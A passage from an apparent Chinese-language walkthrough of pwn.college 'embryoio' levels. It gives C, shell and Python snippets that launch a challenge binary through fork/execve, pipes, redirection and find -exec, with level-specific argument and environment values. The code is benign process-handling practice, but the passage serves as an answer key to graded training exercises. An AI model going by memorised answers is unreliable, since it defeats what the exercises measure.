</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=32>32</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=n>binary</span><span class=p>,</span> <span class=s>&#34;pxcsyjgoss&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;kzdezt=fgdnllplui&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=33>33</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/tmp/igzuqf&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>dup2</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>STDIN_FILENO</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=34>34</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/tmp/bkvmkz&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>dup2</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>STDOUT_FILENO</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=35>35</h3><p>同 29。</p><h3 id=36>36</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> <span class=p>|</span> cat
</span></span></code></pre></td></tr></table></div></div><h3 id=37>37</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> <span class=p>|</span> grep pwn
</span></span></code></pre></td></tr></table></div></div><h3 id=38>38</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> <span class=p>|</span> sed /pwn/p
</span></span></code></pre></td></tr></table></div></div><h3 id=39>39</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> <span class=p>|</span> rev <span class=p>|</span> rev
</span></span></code></pre></td></tr></table></div></div><h3 id=40>40</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ cat <span class=p>|</span> /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=41>41</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ rev <span class=p>|</span> /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></td></tr></table></div></div><p>倒序输入密码，<code>Ctrl+D</code>。</p><h3 id=42-47>42-47</h3><p>类似 36-41，但用 shell 脚本执行。</p><h3 id=48>48</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;cat&#34;</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>48-53 都需要：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ipython
</span></span><span class=line><span class=cl>&gt; %run interact.py
</span></span></code></pre></td></tr></table></div></div><h3 id=49>49</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s2>&#34;grep&#34;</span><span class=p>,</span><span class=s2>&#34;pwn&#34;</span><span class=p>],</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=50>50</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s2>&#34;sed&#34;</span><span class=p>,</span><span class=s2>&#34;/pwn/p&#34;</span><span class=p>],</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=51>51</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;rev&#34;</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p3</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;rev&#34;</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p2</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p3</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=52>52</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;cat&#34;</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=53>53</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;rev&#34;</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>倒序输入密码，<code>Ctrl+D</code>。</p><h3 id=54-59>54-59</h3><p>类似 48-53，但使用 python 执行而不是 ipython。</p><h3 id=60-65>60-65</h3><p>类似 36-41，但使用 29 的方法编译出 <code>a.out</code> 并执行。</p><h3 id=66>66</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find /challenge/ -name embryoio* -exec <span class=o>{}</span> <span class=se>\;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=67>67</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find /challenge/ -name embryoio* -exec <span class=o>{}</span> uwazdyddun <span class=se>\;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=68>68</h3><p>68-73 模版：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pwncollege</span><span class=p>()</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>binary</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;/challenge/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>strcat</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>getenv</span><span class=p>(</span><span class=s>&#34;HOSTNAME&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* TODO */</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>核心代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>binary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>142</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;dummy&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>142</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;nillucsndu&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>143</span><span class=p>]</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=69>69</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=70>70</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;146=sdzbeolria&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=71>71</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;254=xeqznkovla&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>binary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>77</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;dummy&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>77</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;balycwokzx&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>78</span><span class=p>]</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=72>72</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nb>cd</span> /tmp/ehpfci
</span></span><span class=line><span class=cl>/challenge/<span class=nv>$HOSTNAME</span> &lt; jysqyp
</span></span></code></pre></td></tr></table></div></div><h3 id=73>73</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>bash -c <span class=s1>&#39;cd /tmp/wvliga &amp;&amp; /challenge/$HOSTNAME&#39;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=74>74</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
